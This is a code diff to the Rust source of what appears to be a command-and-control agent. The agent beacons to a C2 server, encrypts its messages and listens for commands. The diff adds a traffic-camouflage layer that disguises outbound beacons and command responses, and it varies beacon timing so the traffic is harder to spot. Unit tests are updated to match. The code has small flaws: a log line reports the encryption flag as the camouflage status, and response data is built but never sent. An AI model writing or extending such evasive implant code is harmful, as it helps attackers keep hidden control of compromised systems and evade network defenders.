@@ -8,6 +8,7 @@ use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 
 use crate::crypto::{CryptoManager, KeyExchangePayload};
 use crate::mutation::MutationEngine;
+use crate::camouflage::{TrafficProfile, CamouflageMode};
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct Message {
@@ -55,6 +56,7 @@ pub struct Communicator {
     beacon_interval: u64,
     crypto: Arc<RwLock<CryptoManager>>,
     mutation: Arc<RwLock<MutationEngine>>,
+    traffic: Arc<RwLock<TrafficProfile>>,
     session_established: Arc<RwLock<bool>>,
 }
 
@@ -66,7 +68,10 @@ impl Communicator {
         beacon_interval: u64,
         crypto: CryptoManager,
         mutation_seed: &[u8; 32],
+        camouflage_mode: CamouflageMode,
     ) -> Self {
+        let traffic = TrafficProfile::new(camouflage_mode, beacon_interval, mutation_seed);
+
         Self {
             url: url.to_string(),
             port,
@@ -77,6 +82,7 @@ impl Communicator {
             beacon_interval,
             crypto: Arc::new(RwLock::new(crypto)),
             mutation: Arc::new(RwLock::new(MutationEngine::new(mutation_seed))),
+            traffic: Arc::new(RwLock::new(traffic)),
             session_established: Arc::new(RwLock::new(false)),
         }
     }
@@ -217,13 +223,18 @@ impl Communicator {
         let established = self.session_established.read().await;
         let wire_data = if *established {
             let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
-            serde_json::to_string(&envelope)?
+            let envelope_json = serde_json::to_string(&envelope)?;
+
+            // Step 3: Apply traffic camouflage
+            let mut traffic = self.traffic.write().await;
+            let camouflaged = traffic.wrap_outbound(envelope_json.as_bytes());
+            String::from_utf8_lossy(&camouflaged).to_string()
         } else {
             serialized.clone()
         };
 
-        debug!("Sending encrypted beacon (seq: {}, size: {} bytes)", seq, wire_data.len());
-        info!("Beacon sent (sequence: {}, encrypted: {})", seq, *established);
+        debug!("Sending camouflaged beacon (seq: {}, size: {} bytes)", seq, wire_data.len());
+        info!("Beacon sent (sequence: {}, encrypted: {}, camouflaged: {})", seq, *established, *established);
         Ok(wire_data)
     }
 
@@ -246,16 +257,25 @@ impl Communicator {
         let serialized = serde_json::to_string(&message)?;
 
         let established = self.session_established.read().await;
-        let wire_data = if *established {
+        let _wire_data = if *established {
             let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
-            serde_json::to_string(&envelope)?
+            let envelope_json = serde_json::to_string(&envelope)?;
+
+            let mut traffic = self.traffic.write().await;
+            let camouflaged = traffic.wrap_outbound(envelope_json.as_bytes());
+            String::from_utf8_lossy(&camouflaged).to_string()
         } else {
             serialized
         };
 
-        debug!("Sending encrypted response (seq: {}, size: {} bytes)", seq, wire_data.len());
+        debug!("Sending camouflaged response (seq: {}, size: {} bytes)", seq, _wire_data.len());
         info!("Command response sent (sequence: {}, encrypted: {})", seq, *established);
         Ok(())
+    }
+
+    pub async fn next_beacon_interval(&self) -> u64 {
+        let mut traffic = self.traffic.write().await;
+        traffic.next_beacon_interval()
     }
 
     pub async fn receive_command(
@@ -263,7 +283,8 @@ impl Communicator {
     ) -> Result<Option<String>, Box<dyn std::error::Error>> {
         debug!("Listening for commands from C2 server");
 
-        sleep(Duration::from_secs(self.beacon_interval)).await;
+        let interval = self.next_beacon_interval().await;
+        sleep(Duration::from_secs(interval)).await;
 
         // In production: read from WebSocket, then:
         //   let envelope: EncryptedEnvelope = serde_json::from_str(&raw)?;
@@ -297,7 +318,7 @@ mod tests {
     fn test_communicator_creation() {
         let key = [42u8; 32];
         let crypto = CryptoManager::new(&key).unwrap();
-        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30, crypto, &key);
+        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30, crypto, &key, CamouflageMode::None);
         assert_eq!(comm.get_agent_id(), "test-agent-id");
         assert_eq!(comm.url, "localhost");
         assert_eq!(comm.port, 8000);
@@ -307,7 +328,7 @@ mod tests {
     fn test_websocket_url() {
         let key = [42u8; 32];
         let crypto = CryptoManager::new(&key).unwrap();
-        let comm = Communicator::new("example.com", 443, "agent-123", 30, crypto, &key);
+        let comm = Communicator::new("example.com", 443, "agent-123", 30, crypto, &key, CamouflageMode::None);
         assert_eq!(comm.get_websocket_url(), "wss://example.com:443/ws/agent");
     }
 
@@ -315,7 +336,7 @@ mod tests {
     async fn test_sequence_increment() {
         let key = [42u8; 32];
         let crypto = CryptoManager::new(&key).unwrap();
-        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key);
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);
 
         let seq1 = comm.get_next_sequence().await;
         let seq2 = comm.get_next_sequence().await;
@@ -331,7 +352,7 @@ mod tests {
         let key = [42u8; 32];
         let mut crypto = CryptoManager::new(&key).unwrap();
         crypto.init_with_psk().unwrap();
-        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key);
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);
 
         {
             let mut established = comm.session_established.write().await;
@@ -368,7 +389,7 @@ mod tests {
         let key = [42u8; 32];
         let mut crypto = CryptoManager::new(&key).unwrap();
         crypto.init_with_psk().unwrap();
-        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key);
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);
 
         {
             let mut established = comm.session_established.write().await;
